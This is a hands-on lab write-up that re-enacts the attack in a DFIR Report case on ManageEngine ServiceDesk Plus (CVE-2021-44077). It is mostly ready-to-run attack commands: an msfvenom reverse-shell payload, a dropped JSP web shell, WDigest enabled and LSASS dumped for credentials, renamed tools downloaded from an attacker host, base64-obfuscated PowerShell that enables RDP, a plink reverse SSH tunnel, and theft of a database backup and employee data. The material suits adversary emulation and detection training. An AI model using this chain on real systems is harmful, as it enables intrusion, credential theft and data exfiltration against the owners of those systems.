
# Sketching an attack based on "[Will the Real Msiexec Please Stand Up? Exploit Leads to Data Exfiltration](https://thedfirreport.com/2022/06/06/will-the-real-msiexec-please-stand-up-exploit-leads-to-data-exfiltration/)" Report

## 1. Hands On Action: Exploiting [CVE-2021-44077](https://nvd.nist.gov/vuln/detail/CVE-2021-44077) Vulnerability based on POC in [GitHub](https://github.com/horizon3ai/CVE-2021-44077)

a. Based on the [POC](https://github.com/horizon3ai/CVE-2021-44077) msiexec.exe is created through `msfvenom`

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.20.134 LPORT=4444 -f exe > msiexec.exe
```

b. run your listener

```
nc -l 4444
```

c. run the exploit script

```
python3 exploit.py http://192.168.20.135:8080/ msiexec.exe
```

![CVE-Exploitation-Success](CVE-Exploitation-Success.png)

#### But this approach isn't the same as the [report](https://thedfirreport.com/2022/06/06/will-the-real-msiexec-please-stand-up-exploit-leads-to-data-exfiltration/), as in the report the Threat Actor dropped a web shell JSP file `jm2.jsp` and then accessed it.

![image](https://github.com/user-attachments/assets/16c25295-6f5a-465d-96b4-da499027becb)

#### So, I wrote a simple Python script that, when executed a `wbsh.jsp` is written to `\custom\login` directory

![image](https://github.com/user-attachments/assets/a0525bc4-dc65-4c9b-9856-110ae5456b23)


#### then used `pyinstaller` to convert it to an executable exe file

![image](https://github.com/user-attachments/assets/cb7515a7-7eb1-49a0-b72d-5a3e834b0348)

#### now we have `msiexec.exe`, let's use the exploit again

![image](https://github.com/user-attachments/assets/8b473af9-46a4-4f89-9278-ff2b2c1b54b7)

#### It Worked !!

![wbsh](https://github.com/user-attachments/assets/4c83acaf-d287-4330-9b7c-34514170a965)

![image](https://github.com/user-attachments/assets/55a6b0e8-78cf-46d7-ae3f-91f68353e9b8)

#### `whoami` ?
> No Need for Privilege Escalation

![image](https://github.com/user-attachments/assets/78176ea2-9843-480b-984c-b65e5ce7de80)

<hr />

### 2. Next step we are enabling `WDigest` -> then dumping `LSASS`, -> then downloading it

a. Is WDigest Enabled?

```
reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
```

![image](https://github.com/user-attachments/assets/b6029281-dae5-4253-a7c5-8d4365bcc295)


b. Let's Enable it

```
Set-ItemProperty -Force -Path  'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name  'UseLogonCredential' -Value '1'
```

![image](https://github.com/user-attachments/assets/ac6e01e2-ab72-4ba4-928b-4a2ead73f624)

> Yes it is Enabled!

c. Now we have clear plaintext passwords stored in `LSASS`
```
tasklist | findstr "lsass" 
```

![image](https://github.com/user-attachments/assets/58db05a4-2da0-4d51-8bdf-9671eb584c94)

d. Let's dump it
```
C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump, 668 C:\Windows\Temp\logctl.zip full
```

e. Download it

![image](https://github.com/user-attachments/assets/6994c404-8d93-42f3-ae33-89e6cc34c703)

f. after downloading the logctl.zip file, i'ts empty , which was weird and tried multiple ways and every time when i dump it, its empty so i had to use `procdump.exe`. 

![image](https://github.com/user-attachments/assets/ab124bb5-bdf1-4a87-aaa8-0b53bb3d2869)

> I will be adding this part to the lab for more fun

g. Download `procdump.exe`

```
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.2:9000/file2.exe', 'C:\windows\temp\calc.exe')
```
> calc.exe == procdump.exe

h. Use `procdump.exe`
```
C:\windows\temp\calc.exe -accepteula -ma 668 C:\Windows\Temp\logct2.dmp
```

![image](https://github.com/user-attachments/assets/78153249-ea74-4777-8430-05dc64c8c04a)

j. Download it

![image](https://github.com/user-attachments/assets/e3649426-ec9b-4fd8-a3e3-0a0ce7b1acd6)

<hr />

### 3. We have the LSASS dump, we will skip the process of fetching the passwords for now, Let's Go to the next step where the attacker starts tunneling RDP connections over SSH

a. First, we will download `plink.exe` as `ekern.exe`
```
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.2:9000/file.exe', 'C:\windows\temp\ekern.exe')
```

b. By default, RDP is Disabled. Let's check first
```
Get-Service -Name TermService
```

![image](https://github.com/user-attachments/assets/2c8d0804-16c5-4961-9e13-6179a61d723d)

c. Enable RDP, but let's base64 encode this and put it in one-line command

```
Set-Service -Name TermService -StartupType Automatic
Start-Service -Name TermService
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\' -Name 'fDenyTSConnections' -Value 0
```

d. Encoded:

```
powershel.exe -Command "& {[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0LVNlcnZpY2UgLU5hbWUgVGVybVNlcnZpY2UgLVN0YXJ0dXBUeXBlIEF1dG9tYXRpYw0KDQpTdGFydC1TZXJ2aWNlIC1OYW1lIFRlcm1TZXJ2aWNlDQoNClNldC1JdGVtUHJvcGVydHkgLVBhdGggJ0hLTE06XFN5c3RlbVxDdXJyZW50Q29udHJvbFNldFxDb250cm9sXFRlcm1pbmFsIFNlcnZlclwnIC1OYW1lICdmRGVueVRTQ29ubmVjdGlvbnMnIC1WYWx1ZSAw')) | Invoke-Expression}"
```

e. Run the encoded command and let's checkout

```
Get-Service -Name TermService
```

![image](https://github.com/user-attachments/assets/272a554b-5da5-4103-8ec0-18ee4424299e)


f. Download Bitvise SSH Server `192.168.1.2` and Configure credentials

```
username: H@ck3r
password: C@nt_D3f3nd_2021-44077
```

g. Let's write the FXS.bat file to run `ekern.exe` and establish a reverse SSH Connection to RDP

```
echo y|C:\Users\Temp\ekern.exe -ssh -P 443 -l H@ck3r -pw C@nt_D3f3nd_2021-44077 -R 127.0.0.1:49800:192.168.20.150:3389 192.168.1.2
```

h. Another base64? No need to download it

```
powershel.exe -Command "& {[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGJhdGNoQ29udGVudCA9ICdlY2hvIHl8QzpcV2luZG93c1xUZW1wXGVrZXJuLmV4ZSAtc3NoIC1QIDQ0MyAtbCBIQGNrM3IgLXB3IENAbnRfRDNmM25kXzIwMjEtNDQwNzcgLVIgMTI3LjAuMC4xOjQ5ODAwOjE5Mi4xNjguMjAuMTQ1OjMzODkgMTkyLjE2OC4xLjInDQokYmF0Y2hGaWxlUGF0aCA9ICdDOlxVc2Vyc1xWaWN0aW1cRG9jdW1lbnRzXEZYUy5iYXQnDQpTZXQtQ29udGVudCAtUGF0aCAkYmF0Y2hGaWxlUGF0aCAtVmFsdWUgJGJhdGNoQ29udGVudA==')) | Invoke-Expression}"
```

![image](https://github.com/user-attachments/assets/4f85fa3e-6cb0-48be-bc14-597ab146778a)

j. Let's run our batch...

![image](https://github.com/user-attachments/assets/f149d6b7-6b3e-475f-b867-376a98ef18ba)

k. Now It's RDP time

![image](https://github.com/user-attachments/assets/0f083225-b204-4e26-ab6a-89b6193da53f)

![image](https://github.com/user-attachments/assets/2f3579f5-3be2-40be-bad0-cba283211a7d)

it WORKED !!
![image](https://github.com/user-attachments/assets/fbd3d1af-1541-41de-a2a3-23cb1f28a86c)

<hr />

### 4. Stealing Some Data
a. Download postgres DB backup of the ManageEngine ServiceDesk Plus application it's located at `C:\Program Files (x86)\ManageEngine\ServiceDesk\backup\backup_postgres_11303_fullbackup_07_19_2024_20_07\`

![image](https://github.com/user-attachments/assets/07a1e62a-f55e-49b8-ac4d-1dfe56e59476)

b. there is a file named `Employees.xls` located on the Desktop let's see it 

![image](https://github.com/user-attachments/assets/4bf04d98-3165-41a8-8dea-4dbd01abac1d)

<hr />

## Conclusion

We started exploiting [CVE-2021-44077](https://nvd.nist.gov/vuln/detail/CVE-2021-44077) Vulnerability based on POC in [GitHub](https://github.com/horizon3ai/CVE-2021-44077) then a wbsh.jsp file was dropped, and by using it we gained a web shell and after little enummuration we started to dump LSASS after enabling WDigest to allow passwords to be stored in plaintext format. 

Then we have downloaded ekern.exe which was a renamed version of [Plink](https://the.earth.li/~sgtatham/putty/0.58/htmldoc/Chapter7.html), and wrote a batch script `FXS.bat` to establish a reverse SSH connection to tunnel RDP connections over it. After that we stole some confedintial data like `backup_postgres_11303_fullbackup_07_19_2024_20_07_part_1.data` and `Employees.xls`.

> THIS WAS FUN !!

